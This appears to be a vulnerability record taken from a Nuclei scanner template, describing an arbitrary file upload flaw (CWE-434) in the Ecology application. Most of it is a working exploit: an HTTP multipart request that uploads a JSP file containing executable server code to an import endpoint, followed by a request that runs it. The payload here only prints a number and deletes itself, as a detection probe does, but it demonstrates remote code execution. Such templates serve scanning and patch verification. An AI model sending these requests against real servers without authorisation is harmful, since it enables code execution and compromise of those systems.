# Vulnerability: Ecology - Arbitrary File Upload
**Classification:** CWE-434
**Source:** Nuclei Template (`ecology-arbitrary-file-upload.yaml`)

## Description
Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo

------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"
Content-Type: application/octet-stream

<%out.print(364536*876356);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFy3iNVBftjP6IOwo--

GET /page/exportImport/fileTransfer/{{randstr}}.jsp HTTP/1.1
Host: {{Hostname}}
```

